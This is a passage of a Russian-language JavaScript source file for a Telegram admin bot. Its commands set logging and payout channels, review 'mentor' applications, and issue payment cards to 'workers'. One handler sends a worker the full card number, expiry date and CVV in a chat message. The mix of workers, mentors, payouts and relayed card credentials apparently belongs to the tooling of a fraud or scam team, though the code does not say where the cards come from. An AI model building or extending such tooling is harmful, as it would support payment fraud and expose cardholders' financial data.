      .reply(`<b>✅ Группа для логов установлена</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogginggroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      loggingGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логирования действий");
    return ctx
      .reply(`<b>✅ Группа для логирования действий установлена</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setpayoutschannel", async (ctx) => {
  try {
    await ctx.state.bot.update({
      payoutsChannelId: ctx.chat.id,
    });

    log(ctx, "изменил канал для выплат");
    return ctx
      .reply(`<b>✅ Канал для выплат установлен</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_mentor_anket_(\d+)$/, (ctx) => {
  return mentorAnket(ctx, ctx.match[1], true);
});

adminBot.action(/admin_send_card_worker_(.*):(.*):(.*):(.*)_ok/, (ctx) => {
  try {
    ctx.telegram
      .sendMessage(
        ctx.match[4],
        `🚀 Вам была выдана карта:

💳 Номер карты: <b>${ctx.match[1]}</b>
📅 Срок действия: <b>${ctx.match[2]}</b>
🔒 CVV: <b>${ctx.match[3]}</b>`,
        { parse_mode: "HTML" }
      )
      .catch((err) => err);
    ctx.editMessageReplyMarkup(Markup.inlineKeyboard([[Markup.callbackButton("Выдана", "none")]])).catch((err) => err);
  } catch {
    console.log("error");
  }
});

adminBot.action(/admin_cancel_(.*)_get_card/, (ctx) => {
  try {
    ctx.telegram.sendMessage(ctx.match[1], `❌ <b>Вам было отказано в выдаче карты</b>`, { parse_mode: "HTML" });
    ctx.editMessageReplyMarkup(Markup.inlineKeyboard([[Markup.callbackButton("Отказано", "none")]])).catch((err) => err);
  } catch {
    console.log("error");
  }
});

adminBot.command("help", help);
adminBot.action("admin_help", help);

module.exports = adminBot;
